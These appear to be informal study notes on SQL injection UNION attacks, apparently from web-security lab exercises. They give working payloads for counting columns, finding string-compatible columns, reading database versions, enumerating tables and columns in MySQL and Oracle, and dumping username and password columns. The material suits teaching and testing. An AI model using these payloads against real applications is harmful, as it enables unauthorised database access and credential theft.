# UNION attack


execute one or more additional `SELECT` queries and *append* the results to the
original query:

EX:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

returns a single result set with two columns, containing a,b,c,d columns.

  * every individual query must return the same number of columns.
  * data types in each column must be compatible between the individual queries.

Examine:

## how many columns are being returned form the original query?

a 500 response code indicates that there are more columns of data in the
original query => add more `NULL` columns.

1. using `ORDER BY` clause, incrementing the column index until error, indicating
there is no more.

`' ORDER BY 1--` ,2,3 and ....

2. using `UNION SELECT NULL --` and adding more. if the number of NULLs doesn't
match the number of columns, error occurs.

so we append this to the previous request: `'+UNION+SELECT+NULL,NULL--`

## find the compatible column 

Which columns returned from the original query are of a suitable data type
to hold the results from the injected query.

in each column the datatypes must be the same between the original and injected queries => use `NULL` if / because you don't know the type.

try stuff until you find the correct one.

EX:

- compatible with strings:

`'+UNION+SELECT+'abcdef',NULL,NULL--`, replace it with each NULL in turn.

in oracle, even if you are querying `NULL`, you must specify a valid table:`' UNION SELECT 'a','b' FROM dual--`

* in MySQL the `--` must be followed by a space.

you can get the version like this:`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

# get *table information* using UNION based attacks:

1. `'UNION SELECT table_name,NULL FROM information_schema.tables-- `

2. `table_schema = database()`: This restricts the query to only retrieve tables
from the current database.
`
```sql
'UNION+SELECT+column_name,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3d+'users_lfcfpy'--
'UNION+SELECT+password_esrxvu,username_kpjwmf+FROM+users_lfcfpy--
```

3. oracle:
`
```sql
'UNION SELECT table_name,NULL FROM all_tables--
'UNION select column_name,NULL from ALL_TAB_COLUMNS where table_name='USERS_IMYMYY'-
```

4. get *two columns in one*:`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`